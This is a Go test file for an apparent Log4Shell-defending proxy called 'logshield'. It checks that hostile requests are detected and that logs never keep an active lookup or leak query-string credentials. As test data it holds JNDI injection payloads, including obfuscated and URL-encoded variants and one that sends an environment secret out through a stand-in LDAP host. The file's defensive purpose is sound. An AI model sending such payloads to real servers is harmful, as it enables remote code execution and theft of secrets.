package proxy

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"strconv"
	"strings"
	"testing"

	"github.com/TurlaFSB/logshield/internal/engine"
)

// Requests are hostile by definition, so the proxy's own log must never carry an
// active lookup, whichever field the attacker controls.
func TestLogsNeverContainAnActiveLookup(t *testing.T) {
	hostile := []string{
		rawGET("/${jndi:ldap://x.invalid/a}?q=${jndi:ldap://x.invalid/b}", "User-Agent: ${jndi:ldap://x.invalid/c}"),
		rawGET("/%24%7Bjndi:ldap://x.invalid/a%7D", "Cookie: ${jndi:ldap://x.invalid/n}=1; b=${env:HOME}"),
		rawGET("/?${jndi:ldap://x.invalid/name}=1&a=${${lower:j}ndi:ldap://x.invalid/a}"),
		rawGET("/", "X-Nested: "+strings.Repeat("${lower:", 40)+"x"+strings.Repeat("}", 40)),
		rawGET("/", "Referer: ${jndi:ldap://${env:SECRET}.x.invalid/a}"),
		"GET /${x} HTTP/1.1\r\nHost: ${y}\r\nConnection: close\r\n\r\n",
		"${jndi:ldap://x.invalid/a} / HTTP/1.1\r\nHost: a\r\nConnection: close\r\n\r\n",
	}
	for _, mode := range []Mode{ModeMonitor, ModeBlock} {
		h := newHarness(t, func(c *Config) { c.Mode = mode })
		for _, req := range hostile {
			h.raw(req)
		}
		// Hostile bodies, form and multipart field names included.
		form := "${jndi:ldap://x.invalid/n}=${env:A}&b=1"
		h.raw("POST /f HTTP/1.1\r\nHost: a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(form)) + "\r\nConnection: close\r\n\r\n" + form)
		out := h.logs.String()
		if strings.Contains(out, "${") {
			t.Errorf("%s mode: log contains an active lookup:\n%s", mode, out)
		}
		recs := h.logs.records(t) // every line must also be valid JSON
		if len(recs) == 0 {
			t.Fatalf("%s mode: nothing logged", mode)
		}
	}
}

func TestLogRecordShape(t *testing.T) {
	h := newHarness(t, func(c *Config) { c.Mode = ModeBlock })
	h.raw(rawGET("/secret/path?token=hunter2&q="+attack, "User-Agent: "+attack))
	var blocked map[string]any
	for _, r := range h.logs.records(t) {
		if r["msg"] == "request blocked" {
			blocked = r
		}
	}
	if blocked == nil {
		t.Fatalf("no 'request blocked' record in:\n%s", h.logs.String())
	}
	for _, k := range []string{"id", "mode", "action", "status", "decision", "rules", "detections", "remote", "method", "host", "path", "query_bytes", "duration_us"} {
		if _, ok := blocked[k]; !ok {
			t.Errorf("record lacks %q: %v", k, blocked)
		}
	}
	if blocked["level"] != "WARN" || blocked["action"] != "blocked" || blocked["decision"] != "malicious" || blocked["path"] != "/secret/path" {
		t.Errorf("record = %v", blocked)
	}
	if strings.Contains(h.logs.String(), "hunter2") {
		t.Error("the query string (which may carry credentials) was logged")
	}
	ds := blocked["detections"].([]any)
	first := ds[0].(map[string]any)
	if first["rule"] == nil || first["location"] == nil || !strings.Contains(first["evidence"].(string), "ldap://x.invalid/a") {
		t.Errorf("detection = %v", first)
	}
}

func TestCleanRequestsLogOnlyAtDebug(t *testing.T) {
	var buf bytes.Buffer
	h := newHarness(t, func(c *Config) {
		c.Logger = slog.New(slog.NewJSONHandler(&buf, &slog.HandlerOptions{Level: slog.LevelInfo}))
	})
	h.raw(rawGET("/"))
	if buf.Len() != 0 {
		t.Errorf("clean request logged at info: %s", buf.String())
	}
}

func TestDetectionLogIsBounded(t *testing.T) {
	h := newHarness(t, nil)
	var hdr []string
	for i := 0; i < 20; i++ {
		hdr = append(hdr, "X-H"+strings.Repeat("a", i+1)+": ${jndi:ldap://x.invalid/"+strings.Repeat("z", i+1)+"}")
	}
	h.raw(rawGET("/", hdr...))
	for _, r := range h.logs.records(t) {
		if ds, ok := r["detections"].([]any); ok {
			if len(ds) != maxLoggedDetections || r["detections_omitted"] == nil {
				t.Errorf("%d detections logged, omitted=%v", len(ds), r["detections_omitted"])
			}
			return
		}
	}
	t.Fatal("no detections logged")
}

func TestSafeHandler(t *testing.T) {
	var buf bytes.Buffer
	base := slog.New(slog.NewJSONHandler(&buf, nil))
	l := newSafeLogger(base).With("ctx", "${a}").WithGroup("g${x}")
	l.Info("msg ${m}", slog.String("s", "x${jndi:y}"), slog.Group("grp", slog.String("n", "${n}")),
		slog.Any("err", errors.New("boom ${e}")), slog.Any("list", []string{"${l}"}), slog.Any("fine", []int{1, 2}),
		slog.Int("i", 5), slog.String("${key}", "v"))
	out := buf.String()
	if strings.Contains(out, "${") {
		t.Errorf("active lookup survived: %s", out)
	}
	var m map[string]any
	if err := json.Unmarshal(buf.Bytes(), &m); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "$%7B") || !strings.Contains(out, `"fine":[1,2]`) || !strings.Contains(out, `"i":5`) {
		t.Errorf("unexpected output: %s", out)
	}
	if newSafeLogger(newSafeLogger(base)).Handler() == nil {
		t.Error("double wrap broke the handler")
	}
	if !newSafeLogger(base).Enabled(context.Background(), slog.LevelInfo) || newSafeLogger(base).Enabled(context.Background(), slog.LevelDebug) {
		t.Error("Enabled does not follow the wrapped handler")
	}
}

func TestNeutralize(t *testing.T) {
	for in, want := range map[string]string{"plain": "plain", "${x}": "$%7Bx}", "$${x}": "$$%7Bx}", "$ {": "$ {", "${${a}}": "$%7B$%7Ba}}"} {
		if got := neutralize(in); got != want {
			t.Errorf("neutralize(%q) = %q, want %q", in, got, want)
		}
	}
	if got := neutralize("${${"); strings.Contains(got, "${") {
		t.Errorf("neutralize left a lookup: %q", got)
	}
}

func TestEngineDetectionsUseDefangedEvidence(t *testing.T) {
	h := newHarness(t, nil)
	h.raw(rawGET("/", "User-Agent: "+attack))
	if v := engine.Inspect(h.inspected()[0], engine.Config{}); !v.Has(engine.RuleJNDI) {
		t.Fatal("setup: attack not detected")
	}
}
